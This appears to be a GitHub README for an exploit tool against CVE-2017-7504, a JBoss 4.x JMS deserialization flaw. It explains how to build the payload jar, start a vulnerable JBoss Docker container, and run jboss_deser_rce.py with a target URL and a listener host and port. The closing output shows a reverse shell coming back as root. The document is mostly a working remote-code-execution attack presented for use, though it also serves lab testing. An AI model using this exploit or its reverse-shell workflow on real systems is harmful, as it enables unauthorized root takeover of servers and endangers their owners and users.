# jboss_deser_rce

## Summary

CVE-2017-7504  JBoss 4.x JMS                                                                                 
                                                                                                              
HTTPServerILServlet.java in JMS over HTTP Invocation Layer of the JbossMQ implementation, which is enabled   
by default in Red Hat Jboss Application Server <= Jboss 4.X does not restrict the classes for which it       
performs deserialization, which allows remote attackers to execute arbitrary code via                        
crafted serialized data.  

Here is the exploit code for exploit this issue.

## Dependencies

You need first build the project with maven to get a jar files that is needed to trigger the vulnerability. 

```ssh
⬢  jboss_deser_rce  master ⦿ mvn clean install
```

## Usage

Start docker container with JBoss if you want to test this locally

```ssh
⬢  jboss_deser_rce  master ⦿ docker-compose build
Building jboss
Step 1/3 : FROM vulhub/jboss:as-4.0.5
 ---> a559683bea76
Step 2/3 : EXPOSE 8080
 ---> Using cache
 ---> 89cb44590474
Step 3/3 : RUN apt-get update && apt-get install -y      python
 ---> Using cache
 ---> c9cd8143b202
Successfully built c9cd8143b202
Successfully tagged jboss_deser_rce_jboss:latest

⬢  jboss_deser_rce  master ⦿ docker-compose up -d
Creating network "jboss_deser_rce_default" with the default driver
Creating jboss_deser_rce_jboss_1 ... done
```

Verify that container is running.

```ssh
⬢  jboss_deser_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                   COMMAND                  CREATED              STATUS              PORTS                    NAMES
e9842f15c37d        jboss_deser_rce_jboss   "/opt/jboss/jboss4/b…"   About a minute ago   Up About a minute   0.0.0.0:8080->8080/tcp   jboss_deser_rce_jboss_1
```

Run ./jboss_deser_rce.py to get the usage menu. 

```ssh
⬢  jboss_deser_rce  master ⦿ ./jboss_deser_rce.py 

 ▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    
Usage: ./jboss_deser_rce.py <URL> <LHOST> <LPORT>

EXAMPLE: ./jboss_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 1337
```        

Run the exploit

```ssh
⬢  jboss_deser_rce  master ⦿ ./jboss_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 1337
[+] LHOST = 192.168.1.81
[+] Preparing payload
[+] Shell listen
[+] Exploit
root@e9842f15c37d:/opt/jdk# id
uid=0(root) gid=0(root) groups=0(root)
``
